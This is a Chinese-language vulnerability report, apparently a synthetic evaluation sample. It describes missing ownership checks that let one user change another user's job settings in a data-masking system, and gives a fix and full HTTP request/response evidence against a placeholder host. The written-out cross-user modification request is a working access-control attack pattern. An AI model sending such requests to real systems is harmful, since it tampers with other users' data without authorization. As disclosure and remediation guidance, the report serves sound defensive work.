# 示例系统-智能脱敏 作业归属校验缺失：普通用户可修改其他用户的作业设置

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N  评分 2.3（低危）

## 描述
普通用户 B 使用自己的账号修改用户 A 尚未选择敏感类型的作业。A 随后查询，设置从空变为 `name`，状态从 `WAITING` 变为 `SUCCESS`。正式文件内容及是否漏脱敏未验证；需要登录并知道作业编号。
### 定级依据
需要普通账号和目标作业编号。已观察到他人作业设置与状态被修改；文件泄露未验证。

## 修复建议
服务端修改作业前校验当前账号是否为创建者或已获授权的协作者。无权访问时拒绝请求，并保持作业设置和状态不变。

## 测试过程
### 发现过程与攻击思路
先由 A 查询作业，再由 B 提交修改，最后由 A 回读。B 的修改返回 200；A 查询到设置和状态已变化。
### 失败尝试与未验证项
不带身份的修改返回 401。其他作业状态、批量编号和正式文件内容未验证。
### Burp 复现
本次未在 Burp Repeater 中测试。以下请求来自离线合成样本，未发送；`report-eval.invalid` 和 `X-Eval-Actor` 是样本值，不能替换后发往真实目标。授权环境的复测应使用 A、B 各自重新捕获的请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-b
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

## 攻击链路
```text
用户 B 已登录并知道用户 A 的作业编号
└─ 提交作业类型修改
   └─ POST /api/jobs/job-a/types
      └─ 用户 A 回读到设置与状态已改变
```

## 证据说明
材料为离线合成报文，没有测试真实账号或真实作业。完整请求和响应按用途附在下方。
### 复测标准
B 修改 A 的作业时应被拒绝，A 回读的设置和状态应保持不变。

**完整请求与响应**

**修改前查询**

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 92

{"id":"job-a","owner":"user-a","selectedTypes":[],"state":"WAITING","formalAvailable":false}
```

**其他用户提交修改**

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-b
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 11

{"ok":true}
```

**修改后查询**

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 97

{"id":"job-a","owner":"user-a","selectedTypes":["name"],"state":"SUCCESS","formalAvailable":true}
```

**不带身份提交修改**

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 35

{"error":"authentication_required"}
```
